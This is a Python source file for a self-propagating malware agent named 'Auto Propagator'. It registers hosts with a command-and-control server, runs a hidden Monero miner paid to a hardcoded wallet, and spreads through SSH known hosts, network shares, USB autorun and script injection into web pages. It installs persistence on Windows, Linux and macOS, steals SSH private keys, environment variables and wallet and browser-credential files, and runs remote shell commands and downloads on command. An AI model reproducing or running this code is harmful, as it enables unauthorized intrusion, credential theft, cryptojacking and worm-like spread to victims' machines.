#!/usr/bin/env python3
"""
AUTO PROPAGATOR - Self-spreading agent for global domination.
Automatically spreads to new systems and registers with C2.
"""

import os
import sys
import json
import time
import random
import threading
import subprocess
import platform
import socket
import hashlib
import base64
import urllib.request
import urllib.error
from pathlib import Path
from typing import Optional, Dict, List, Any

# Configuration
C2_SERVER = os.environ.get("C2_SERVER", "http://127.0.0.1:5000")
WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
POOL = "pool.monero.hashvault.pro:443"
CHECK_INTERVAL = 60
PROPAGATE_INTERVAL = 300

class AutoPropagator:
    """Self-propagating agent with stealth capabilities."""
    
    def __init__(self, c2_server: str = C2_SERVER):
        self.c2_server = c2_server
        self.agent_id = self._generate_agent_id()
        self.hostname = socket.gethostname()
        self.platform = platform.system().lower()
        self.running = True
        self.mining_process = None
        self.propagation_count = 0
        
    def _generate_agent_id(self) -> str:
        """Generate unique agent ID."""
        data = f"{socket.gethostname()}-{platform.node()}-{time.time()}"
        return hashlib.md5(data.encode()).hexdigest()[:16]
    
    def _get_system_info(self) -> Dict[str, Any]:
        """Collect system information."""
        info = {
            "agent_id": self.agent_id,
            "hostname": self.hostname,
            "platform": self.platform,
            "os": platform.platform(),
            "arch": platform.machine(),
            "cpu_count": os.cpu_count(),
            "username": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
            "ip_internal": self._get_local_ip(),
            "ip_external": self._get_external_ip(),
            "timestamp": time.time()
        }
        
        # GPU info
        try:
            result = subprocess.run(["nvidia-smi", "--query-gpu=name,memory.total", "--format=csv,noheader"],
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                info["gpu"] = result.stdout.strip()
        except:
            info["gpu"] = None
            
        return info
    
    def _get_local_ip(self) -> str:
        """Get local IP address."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _get_external_ip(self) -> str:
        """Get external IP address."""
        try:
            with urllib.request.urlopen("https://api.ipify.org?format=text", timeout=5) as r:
                return r.read().decode().strip()
        except:
            return "unknown"
    
    def register(self) -> bool:
        """Register with C2 server."""
        try:
            data = self._get_system_info()
            req = urllib.request.Request(
                f"{self.c2_server}/api/agent/register",
                data=json.dumps(data).encode(),
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=10) as r:
                result = json.loads(r.read().decode())
                if result.get("status") == "ok":
                    print(f"[+] Registered with C2: {self.agent_id}")
                    return True
        except Exception as e:
            print(f"[-] Registration failed: {e}")
        return False
    
    def get_tasks(self) -> List[Dict]:
        """Get pending tasks from C2."""
        try:
            req = urllib.request.Request(
                f"{self.c2_server}/api/agent/tasks?agent_id={self.agent_id}",
                method="GET"
            )
            with urllib.request.urlopen(req, timeout=10) as r:
                result = json.loads(r.read().decode())
                return result.get("tasks", [])
        except Exception as e:
            print(f"[-] Failed to get tasks: {e}")
        return []
    
    def submit_result(self, task_id: str, result: Dict) -> bool:
        """Submit task result to C2."""
        try:
            data = {"agent_id": self.agent_id, "task_id": task_id, "result": result}
            req = urllib.request.Request(
                f"{self.c2_server}/api/agent/result",
                data=json.dumps(data).encode(),
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=10) as r:
                return True
        except Exception as e:
            print(f"[-] Failed to submit result: {e}")
        return False
    
    def start_mining(self) -> bool:
        """Start hidden mining process."""
        if self.mining_process and self.mining_process.poll() is None:
            return True  # Already running
            
        try:
            # Check for xmrig
            xmrig_path = self._find_xmrig()
            if not xmrig_path:
                print("[-] XMRig not found, downloading...")
                xmrig_path = self._download_xmrig()
            
            if xmrig_path:
                # Start mining with low priority
                cmd = [
                    xmrig_path,
                    "--url", POOL,
                    "--user", WALLET,
                    "--pass", self.agent_id,
                    "--threads", str(max(1, os.cpu_count() - 1)),  # Leave 1 core free
                    "--background",
                    "--donate-level", "1",
                    "--tls",
                    "--nicehash"
                ]
                
                # Lower priority for stealth
                if self.platform == "windows":
                    self.mining_process = subprocess.Popen(
                        ["start", "/min", "/low"] + cmd,
                        shell=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                else:
                    self.mining_process = subprocess.Popen(
                        cmd,
                        preexec_fn=lambda: os.nice(19)  # Lowest priority
                    )
                
                print(f"[+] Mining started: {POOL}")
                return True
        except Exception as e:
            print(f"[-] Mining failed: {e}")
        return False
    
    def _find_xmrig(self) -> Optional[str]:
        """Find xmrig binary."""
        # Common locations
        paths = [
            "/usr/local/bin/xmrig",
            "/usr/bin/xmrig",
            "./xmrig",
            "xmrig",
            "C:\\Windows\\xmrig.exe",
            os.path.expanduser("~/.local/xmrig/xmrig"),
        ]
        
        for path in paths:
            if os.path.exists(path):
                return path
        
        # Check PATH
        try:
            result = subprocess.run(["which", "xmrig"], capture_output=True)
            if result.returncode == 0:
                return "xmrig"
        except:
            pass
        
        return None
    
    def _download_xmrig(self) -> Optional[str]:
        """Download xmrig binary."""
        try:
            # Determine download URL based on platform
            if self.platform == "windows":
                url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
            else:
                url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
            
            # Download
            download_dir = os.path.expanduser("~/.cache/.system")
            os.makedirs(download_dir, exist_ok=True)
            
            archive_path = os.path.join(download_dir, "xmrig.tar.gz")
            urllib.request.urlretrieve(url, archive_path)
            
            # Extract
            subprocess.run(["tar", "-xzf", archive_path, "-C", download_dir], check=True)
            
            # Find extracted binary
            for root, dirs, files in os.walk(download_dir):
                for f in files:
                    if "xmrig" in f.lower() and not f.endswith(".txt"):
                        xmrig_path = os.path.join(root, f)
                        os.chmod(xmrig_path, 0o755)
                        return xmrig_path
                        
        except Exception as e:
            print(f"[-] Download failed: {e}")
        
        return None
    
    def propagate(self) -> int:
        """Spread to other systems."""
        spread_count = 0
        
        # Method 1: SSH spread
        spread_count += self._propagate_ssh()
        
        # Method 2: Network shares
        spread_count += self._propagate_shares()
        
        # Method 3: USB drives
        spread_count += self._propagate_usb()
        
        # Method 4: Download on visited websites (if web server)
        spread_count += self._propagate_web()
        
        self.propagation_count += spread_count
        return spread_count
    
    def _propagate_ssh(self) -> int:
        """Spread via SSH to known hosts."""
        count = 0
        
        try:
            # Read known_hosts and authorized_keys
            ssh_dir = os.path.expanduser("~/.ssh")
            known_hosts = os.path.join(ssh_dir, "known_hosts")
            
            if os.path.exists(known_hosts):
                with open(known_hosts) as f:
                    hosts = [line.split()[0] for line in f if line.strip()]
                
                # Try to spread to each host
                for host in hosts[:10]:  # Limit to 10
                    try:
                        # Copy self to remote
                        self_path = os.path.abspath(__file__)
                        subprocess.run(
                            ["scp", "-o", "StrictHostKeyChecking=no", 
                             self_path, f"{host}:/tmp/.update"],
                            timeout=30, capture_output=True
                        )
                        # Execute on remote
                        subprocess.run(
                            ["ssh", "-o", "StrictHostKeyChecking=no", host,
                             "python3 /tmp/.update &"],
                            timeout=30, capture_output=True
                        )
                        count += 1
                    except:
                        continue
        except Exception as e:
            print(f"[-] SSH propagation failed: {e}")
        
        return count
    
    def _propagate_shares(self) -> int:
        """Spread via network shares."""
        count = 0
        
        if self.platform == "windows":
            try:
                # Find network shares
                result = subprocess.run(
                    ["net", "view"],
                    capture_output=True, text=True, timeout=30
                )
                
                shares = []
                for line in result.stdout.split("\n"):
                    if "\\" in line:
                        share = line.split()[0]
                        shares.append(share)
                
                # Copy to shares
                self_path = os.path.abspath(__file__)
                for share in shares[:5]:
                    try:
                        dest = f"{share}\\Documents\\update.exe"
                        subprocess.run(["copy", self_path, dest], timeout=30)
                        count += 1
                    except:
                        continue
            except:
                pass
        else:
            # Linux: NFS, Samba
            try:
                result = subprocess.run(
                    ["df", "-t", "nfs,cifs"],
                    capture_output=True, text=True
                )
                
                mounts = []
                for line in result.stdout.split("\n")[1:]:
                    if line.strip():
                        mount = line.split()[-1]
                        mounts.append(mount)
                
                self_path = os.path.abspath(__file__)
                for mount in mounts[:5]:
                    try:
                        dest = os.path.join(mount, ".system_update.py")
                        subprocess.run(["cp", self_path, dest], timeout=30)
                        count += 1
                    except:
                        continue
            except:
                pass
        
        return count
    
    def _propagate_usb(self) -> int:
        """Spread via USB drives (autorun)."""
        count = 0
        
        try:
            if self.platform == "windows":
                # Find removable drives
                for drive in "DEFGHIJKLMNOPQRSTUVWXYZ":
                    drive_path = f"{drive}:\\"
                    if os.path.exists(drive_path):
                        # Create autorun.inf
                        autorun = f"""[autorun]
open=update.exe
icon=update.exe
action=Open folder
"""
                        with open(os.path.join(drive_path, "autorun.inf"), "w") as f:
                            f.write(autorun)
                        
                        # Copy self
                        self_path = os.path.abspath(__file__)
                        subprocess.run(["copy", self_path, f"{drive_path}update.exe"])
                        count += 1
            else:
                # Linux: /media/* or /run/media/*
                media_dirs = ["/media", "/run/media"]
                for media_dir in media_dirs:
                    if os.path.exists(media_dir):
                        for user_dir in os.listdir(media_dir):
                            user_path = os.path.join(media_dir, user_dir)
                            if os.path.isdir(user_path):
                                for drive in os.listdir(user_path):
                                    drive_path = os.path.join(user_path, drive)
                                    if os.path.isdir(drive_path):
                                        # Copy with hidden name
                                        self_path = os.path.abspath(__file__)
                                        dest = os.path.join(drive_path, ".system_update.py")
                                        subprocess.run(["cp", self_path, dest])
                                        count += 1
        except:
            pass
        
        return count
    
    def _propagate_web(self) -> int:
        """Spread via web (if this system is a web server)."""
        count = 0
        
        try:
            # Check for web directories
            web_dirs = [
                "/var/www/html",
                "/usr/share/nginx/html",
                "C:\\inetpub\\wwwroot",
                "C:\\xampp\\htdocs",
            ]
            
            payload = self._generate_web_payload()
            
            for web_dir in web_dirs:
                if os.path.exists(web_dir):
                    # Inject into existing pages
                    for root, dirs, files in os.walk(web_dir):
                        for f in files:
                            if f.endswith((".html", ".php", ".js")):
                                file_path = os.path.join(root, f)
                                try:
                                    with open(file_path, "r+") as fp:
                                        content = fp.read()
                                        if payload not in content:
                                            fp.seek(0)
                                            fp.write(content.replace("</body>", payload + "</body>"))
                                            count += 1
                                except:
                                    continue
        except:
            pass
        
        return count
    
    def _generate_web_payload(self) -> str:
        """Generate web payload for browser infection."""
        # This will be a script tag that loads browser agent
        return f'''<script>
(function(){{
    var s=document.createElement('script');
    s.src='{self.c2_server}/static/browser_agent.js';
    document.head.appendChild(s);
}})();
</script>'''
    
    def install_persistence(self) -> bool:
        """Install persistence mechanism."""
        success = False
        
        if self.platform == "windows":
            success = self._persistence_windows()
        elif self.platform == "darwin":
            success = self._persistence_macos()
        else:
            success = self._persistence_linux()
        
        return success
    
    def _persistence_windows(self) -> bool:
        """Windows persistence methods."""
        try:
            self_path = os.path.abspath(__file__)
            
            # Method 1: Registry Run key
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, f'pythonw "{self_path}"')
            winreg.CloseKey(key)
            
            # Method 2: Scheduled task
            subprocess.run([
                "schtasks", "/create", "/tn", "SystemUpdate",
                "/tr", f'pythonw "{self_path}"',
                "/sc", "onlogon", "/rl", "highest", "/f"
            ], capture_output=True)
            
            # Method 3: Startup folder
            startup = os.path.join(
                os.environ["APPDATA"],
                r"Microsoft\Windows\Start Menu\Programs\Startup"
            )
            bat_path = os.path.join(startup, "update.bat")
            with open(bat_path, "w") as f:
                f.write(f'@echo off\nstart /min pythonw "{self_path}"\n')
            
            print("[+] Windows persistence installed")
            return True
        except Exception as e:
            print(f"[-] Windows persistence failed: {e}")
        return False
    
    def _persistence_linux(self) -> bool:
        """Linux persistence methods."""
        try:
            self_path = os.path.abspath(__file__)
            
            # Method 1: Cron job
            cron_job = f"@reboot python3 {self_path}\n"
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            if cron_job not in result.stdout:
                with open("/tmp/cron_update", "w") as f:
                    f.write(result.stdout + cron_job)
                subprocess.run(["crontab", "/tmp/cron_update"])
            
            # Method 2: Systemd service
            service = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {self_path}
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""
            service_path = "/etc/systemd/system/system-update.service"
            if os.access("/etc/systemd/system", os.W_OK):
                with open(service_path, "w") as f:
                    f.write(service)
                subprocess.run(["systemctl", "daemon-reload"])
                subprocess.run(["systemctl", "enable", "system-update"])
            
            # Method 3: .bashrc / .profile
            for rc_file in [".bashrc", ".profile", ".zshrc"]:
                rc_path = os.path.expanduser(f"~/{rc_file}")
                if os.path.exists(rc_path):
                    with open(rc_path, "a") as f:
                        f.write(f"\n# System update\npython3 {self_path} &\n")
            
            print("[+] Linux persistence installed")
            return True
        except Exception as e:
            print(f"[-] Linux persistence failed: {e}")
        return False
    
    def _persistence_macos(self) -> bool:
        """macOS persistence methods."""
        try:
            self_path = os.path.abspath(__file__)
            
            # Launch Agent
            plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{self_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
            launch_dir = os.path.expanduser("~/Library/LaunchAgents")
            os.makedirs(launch_dir, exist_ok=True)
            plist_path = os.path.join(launch_dir, "com.apple.system.update.plist")
            with open(plist_path, "w") as f:
                f.write(plist)
            
            subprocess.run(["launchctl", "load", plist_path])
            
            print("[+] macOS persistence installed")
            return True
        except Exception as e:
            print(f"[-] macOS persistence failed: {e}")
        return False
    
    def collect_data(self) -> Dict:
        """Collect sensitive data from system."""
        data = {
            "browser_passwords": self._collect_browser_passwords(),
            "browser_cookies": self._collect_browser_cookies(),
            "browser_history": self._collect_browser_history(),
            "wallets": self._collect_wallets(),
            "ssh_keys": self._collect_ssh_keys(),
            "env_vars": dict(os.environ),
            "processes": self._get_process_list(),
        }
        return data
    
    def _collect_browser_passwords(self) -> List[Dict]:
        """Extract browser passwords."""
        passwords = []
        
        # Chrome passwords
        try:
            chrome_path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
            if os.path.exists(chrome_path):
                # Would need to decrypt SQLite DB
                passwords.append({"browser": "chrome", "path": chrome_path})
        except:
            pass
        
        # Firefox passwords
        try:
            firefox_path = os.path.expanduser("~/.mozilla/firefox")
            if os.path.exists(firefox_path):
                for profile in os.listdir(firefox_path):
                    if profile.endswith(".default"):
                        logins = os.path.join(firefox_path, profile, "logins.json")
                        if os.path.exists(logins):
                            passwords.append({"browser": "firefox", "path": logins})
        except:
            pass
        
        return passwords
    
    def _collect_browser_cookies(self) -> List[Dict]:
        """Extract browser cookies."""
        cookies = []
        
        # Similar to passwords, would need decryption
        return cookies
    
    def _collect_browser_history(self) -> List[Dict]:
        """Extract browser history."""
        history = []
        return history
    
    def _collect_wallets(self) -> List[Dict]:
        """Find cryptocurrency wallets."""
        wallets = []
        
        wallet_paths = [
            "~/.bitcoin/wallet.dat",
            "~/.monero/wallet",
            "~/.ethereum/keystore",
            "~/.electrum/wallets",
            "~/Documents/Bitcoin/wallet.dat",
        ]
        
        for path in wallet_paths:
            full_path = os.path.expanduser(path)
            if os.path.exists(full_path):
                wallets.append({"type": "wallet", "path": full_path})
        
        return wallets
    
    def _collect_ssh_keys(self) -> List[Dict]:
        """Collect SSH keys."""
        keys = []
        
        ssh_dir = os.path.expanduser("~/.ssh")
        if os.path.exists(ssh_dir):
            for f in os.listdir(ssh_dir):
                if f.startswith("id_") and not f.endswith(".pub"):
                    key_path = os.path.join(ssh_dir, f)
                    try:
                        with open(key_path) as fp:
                            keys.append({"name": f, "key": fp.read()})
                    except:
                        pass
        
        return keys
    
    def _get_process_list(self) -> List[str]:
        """Get running processes."""
        try:
            result = subprocess.run(["ps", "aux"], capture_output=True, text=True)
            return result.stdout.split("\n")[:50]
        except:
            return []
    
    def run(self):
        """Main execution loop."""
        print(f"[*] Auto Propagator starting: {self.agent_id}")
        print(f"[*] Platform: {self.platform}")
        print(f"[*] C2 Server: {self.c2_server}")
        
        # Initial registration
        self.register()
        
        # Install persistence
        self.install_persistence()
        
        # Start mining
        self.start_mining()
        
        # Main loop
        while self.running:
            try:
                # Get tasks
                tasks = self.get_tasks()
                for task in tasks:
                    self._execute_task(task)
                
                # Periodic propagation
                if random.random() < 0.1:  # 10% chance each cycle
                    spread = self.propagate()
                    if spread > 0:
                        print(f"[+] Spread to {spread} new systems")
                
                # Periodic data collection
                if random.random() < 0.05:  # 5% chance
                    data = self.collect_data()
                    # Submit to C2
                
                # Heartbeat
                self.register()
                
            except Exception as e:
                print(f"[-] Error in main loop: {e}")
            
            time.sleep(CHECK_INTERVAL)
    
    def _execute_task(self, task: Dict):
        """Execute a task from C2."""
        task_type = task.get("task_type")
        task_id = task.get("id")
        
        print(f"[*] Executing task: {task_type}")
        
        result = {"status": "completed", "timestamp": time.time()}
        
        try:
            if task_type == "cmd":
                cmd = task.get("payload", {}).get("cmd", "")
                proc = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                result["stdout"] = proc.stdout
                result["stderr"] = proc.stderr
                result["returncode"] = proc.returncode
                
            elif task_type == "download":
                url = task.get("payload", {}).get("url")
                path = task.get("payload", {}).get("path", "/tmp/download")
                urllib.request.urlretrieve(url, path)
                result["path"] = path
                
            elif task_type == "upload":
                path = task.get("payload", {}).get("path")
                if os.path.exists(path):
                    with open(path, "rb") as f:
                        result["data"] = base64.b64encode(f.read()).decode()
                        
            elif task_type == "propagate":
                count = self.propagate()
                result["spread_count"] = count
                
            elif task_type == "collect":
                data = self.collect_data()
                result["data"] = data
                
            elif task_type == "mining_start":
                self.start_mining()
                result["mining"] = True
                
            elif task_type == "mining_stop":
                if self.mining_process:
                    self.mining_process.terminate()
                    self.mining_process = None
                result["mining"] = False
                
        except Exception as e:
            result["status"] = "failed"
            result["error"] = str(e)
        
        # Submit result
        self.submit_result(task_id, result)


def main():
    """Main entry point."""
    propagator = AutoPropagator()
    
    try:
        propagator.run()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        propagator.running = False


if __name__ == "__main__":
    main()
